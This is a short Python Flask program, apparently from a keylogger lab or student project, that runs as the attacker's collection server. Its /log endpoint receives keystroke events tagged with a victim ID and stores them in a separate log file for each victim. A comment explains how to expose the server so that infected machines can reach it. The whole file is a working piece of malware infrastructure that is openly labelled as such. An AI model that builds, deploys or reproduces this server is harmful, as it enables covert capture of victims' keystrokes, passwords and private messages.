# Libraries required for the web server and data handling
from flask import Flask, request, jsonify # Flask handles routing and HTTP operations
import json # Used to handle JSON serialization
import os   # Used for file system operations (creating directories)

# Initialize the Flask application
app = Flask(__name__)

# Ensure the main storage directory exists
# All incoming logs will be stored here.
os.makedirs("stockage", exist_ok=True)

@app.post("/log")
def log():
    """
    HTTP POST endpoint to receive and store keylogger events.
    The keylogger sends data to this endpoint.
    """
    # Attempt to parse the JSON data from the request body. 
    # silent=True prevents Flask from raising an exception if the JSON is malformed.
    data = request.get_json(silent=True)
    
    # Check if data parsing failed (no JSON or invalid format)
    if not data:
        return jsonify({"error": "Invalid JSON"}), 400

    # Extract the victim ID, defaulting to "unknown" if missing
    victim = data.get("victim_id", "unknown")
    
    # Create a dedicated directory for the victim if it doesn't exist
    os.makedirs(f"stockage/{victim}", exist_ok=True)

    # Define the path to the victim's log file (JSON Lines format)
    path = f"stockage/{victim}/events.jsonl"
    
    # Append the entire received data packet (containing events) to the log file
    with open(path, "a") as f:
        f.write(json.dumps(data) + "\n")

    # Send a successful response back to the keylogger
    return jsonify({"status": "ok"}), 200

@app.get("/")
def home():
    """
    Simple GET endpoint for health check.
    """
    return "Attacker Server Active"

# Standard Python entry point
if __name__ == "__main__":
    # Run the Flask application
    # host="0.0.0.0" is generally recommended when running on a VM 
    # so the server is accessible from the external network/victim.
    # NOTE: The provided code uses 127.0.0.1, which only allows access from the host itself.
    # To be reachable by the victim, it should be changed to 0.0.0.0 or the VM's actual IP.
    app.run(host="127.0.0.1", port=5000)